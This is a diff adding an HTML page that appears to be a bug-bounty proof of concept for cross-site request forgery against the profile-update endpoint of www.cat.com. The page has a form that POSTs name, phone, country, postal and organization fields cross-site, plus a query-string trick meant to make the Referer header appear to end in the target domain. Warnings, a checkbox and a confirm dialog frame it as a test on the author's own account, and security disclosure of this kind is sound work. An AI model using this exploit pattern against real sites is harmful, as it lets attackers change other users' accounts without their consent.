@@ -1,0 +1,102 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="referrer" content="unsafe-url">
+  <meta name="robots" content="noindex,nofollow,noarchive">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Authorized CAT profile CSRF validation</title>
+  <style>
+    :root { color-scheme: light dark; font-family: system-ui, sans-serif; }
+    body { max-width: 760px; margin: 32px auto; padding: 0 18px; line-height: 1.45; }
+    form { border: 1px solid #8886; border-radius: 10px; padding: 18px; margin: 20px 0; }
+    label.field { display: grid; grid-template-columns: 180px 1fr; gap: 12px; margin: 9px 0; }
+    input { padding: 7px; }
+    button { padding: 10px 14px; margin-top: 14px; cursor: pointer; }
+    code { overflow-wrap: anywhere; }
+    .warning { border-left: 4px solid #d78b00; padding: 10px 14px; background: #d78b0018; }
+  </style>
+</head>
+<body>
+  <h1>Authorized CAT profile CSRF validation</h1>
+
+  <p class="warning">
+    Use only while logged into your own CAT research account. This page performs a real profile update after you
+    press the button and confirm. Intercept it in Burp and do not modify browser-generated provenance headers or
+    the session cookie.
+  </p>
+
+  <p>
+    Open this page with <code>?probe=\@www.cat.com</code> as the final query parameter. A valid test request should
+    contain <code>Origin: https://nayssers.github.io</code>, a full <code>Referer</code> ending in
+    <code>?probe=\@www.cat.com</code>, and <code>Sec-Fetch-Site: cross-site</code>.
+  </p>
+
+  <form id="csrf-test" method="post" enctype="application/x-www-form-urlencoded"
+        data-action="https://www.cat.com/content/catdotcom/en_MX/account/myaccount/account-information/jcr:content/root/responsivegrid_1010483686/userprofile.updateUserProfile.html">
+    <h2>State-changing test</h2>
+    <p>Copy your current profile values so the test does not unintentionally erase them. The surname marker changes on every load.</p>
+
+    <label class="field">Given name canary
+      <input name="givenname" value="CSRFREMOTE" required autocomplete="off">
+    </label>
+    <label class="field">Generated surname
+      <input id="test-surname" name="sn" readonly required>
+    </label>
+    <label class="field">Current telephone
+      <input name="telephonenumber" required autocomplete="off" placeholder="Enter your current value">
+    </label>
+    <label class="field">Current country code
+      <input name="c" required autocomplete="off" placeholder="Example: MA">
+    </label>
+    <label class="field">Current state / region
+      <input name="st" required autocomplete="off" placeholder="Enter your current value">
+    </label>
+    <label class="field">Current postal code
+      <input name="postalcode" required autocomplete="off" placeholder="Enter your current value">
+    </label>
+    <label class="field">Current organization
+      <input name="o" required autocomplete="off" placeholder="Enter your current value">
+    </label>
+    <input type="hidden" name="userProfile" value="true">
+
+    <label>
+      <input id="authorization" type="checkbox" required>
+      I confirm this is my own authorized CAT test account and I will restore the profile after testing.
+    </label>
+
+    <button type="submit">POST now to www.cat.com — change my profile</button>
+  </form>
+
+  <script>
+    const form = document.getElementById('csrf-test');
+    const surname = document.getElementById('test-surname');
+
+    function refreshMarker() {
+      surname.value = `CSRFR${Date.now().toString().slice(-9)}`;
+    }
+
+    refreshMarker();
+
+    form.addEventListener('submit', (event) => {
+      event.preventDefault();
+
+      if (!document.getElementById('authorization').checked) {
+        return;
+      }
+
+      const approved = window.confirm(
+        'This will POST the displayed values to www.cat.com and change your authenticated profile. Continue?'
+      );
+
+      if (!approved) {
+        return;
+      }
+
+      refreshMarker();
+      form.action = form.dataset.action;
+      HTMLFormElement.prototype.submit.call(form);
+    });
+  </script>
+</body>
+</html>
